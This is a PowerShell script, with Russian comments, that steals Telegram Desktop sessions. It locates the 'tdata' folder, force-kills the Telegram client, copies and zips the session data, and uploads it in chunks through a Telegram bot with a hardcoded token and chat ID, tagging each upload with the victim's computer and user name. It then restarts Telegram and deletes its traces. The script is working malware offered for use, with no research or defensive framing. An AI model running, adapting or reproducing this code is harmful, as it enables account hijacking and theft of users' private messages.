param([string]$Token, [string]$ChatID)
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'
if (-not $Token)  { $Token  = '9144321837:AAHrcLLsQqlZGQNXFdry99NnBKfTIHLCK90' }
if (-not $ChatID) { $ChatID = '1859879540' }

$api   = "https://api.telegram.org/bot$Token/sendDocument"
$curl  = (Get-Command curl.exe -ErrorAction SilentlyContinue).Source
$stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
$cap   = "$env:COMPUTERNAME | $env:USERNAME | $stamp"

function Post([string]$file, [string]$text) {
    if ($curl) {
        & $curl -s --max-time 180 -F "document=@$file" -F "caption=$text" $api | Out-Null
        return
    }
    Add-Type -AssemblyName System.Net.Http
    $hc = New-Object System.Net.Http.HttpClient
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $fs = [IO.File]::OpenRead($file)
    $sc = New-Object System.Net.Http.StreamContent($fs)
    $mp.Add($sc, 'document', [IO.Path]::GetFileName($file))
    $mp.Add((New-Object System.Net.Http.StringContent($text)), 'caption')
    $hc.PostAsync($api, $mp).GetAwaiter().GetResult() | Out-Null
    $fs.Dispose(); $mp.Dispose(); $hc.Dispose()
}

function Send-Large([string]$path, [string]$text) {
    $limit = 45MB
    if ((Get-Item $path).Length -le $limit) { Post $path $text; return }
    $fs = [IO.File]::OpenRead($path); $i = 0
    try {
        while ($fs.Position -lt $fs.Length) {
            $part = "$path.part$i"
            $out  = [IO.File]::Create($part)
            try {
                $left = $limit; $buf = New-Object byte[] (1MB)
                while ($left -gt 0 -and $fs.Position -lt $fs.Length) {
                    $n = $fs.Read($buf, 0, [Math]::Min($buf.Length, $left))
                    if ($n -le 0) { break }
                    $out.Write($buf, 0, $n); $left -= $n
                }
            } finally { $out.Close() }
            Post $part "$text [part $i]"
            Remove-Item $part -Force
            $i++
        }
    } finally { $fs.Close() }
}

# --- поиск tdata: обычный путь + портативная сборка по пути процесса
$cands = @()
$cands += Join-Path $env:APPDATA 'Telegram Desktop\tdata'
$proc = Get-Process Telegram -ErrorAction SilentlyContinue | Select-Object -First 1
if ($proc -and $proc.Path) { $cands += Join-Path (Split-Path $proc.Path) 'tdata' }
$cands += 'C:\Telegram\tdata'
$cands += Join-Path $env:USERPROFILE 'Downloads\Telegram\tdata'

$src = $cands | Where-Object { Test-Path (Join-Path $_ 'key_datas') } | Select-Object -First 1
if (-not $src) { Post '' "no tdata: $cap"; exit }
$exe = Split-Path $src
$exe = Join-Path $exe 'Telegram.exe'

# --- остановка клиента (обязательно, иначе копия битая)
Stop-Process -Name Telegram -Force
Start-Sleep -Seconds 3

$out = Join-Path $env:TEMP "td_$stamp"
$zip = "$out.zip"
robocopy $src $out /E /XD cache /NFL /NDL /NJH /NJS /R:1 /W:1 | Out-Null

if (Test-Path (Join-Path $out 'key_datas')) {
    Compress-Archive (Join-Path $out '*') $zip -Force
    Send-Large $zip "$cap | $([Math]::Round((Get-Item $zip).Length/1MB,2))MB"
} else {
    Post '' "copy failed: $cap"
}

# --- вернуть как было
if (Test-Path $exe) { Start-Process $exe }
Remove-Item $out -Recurse -Force
Remove-Item $zip -Force
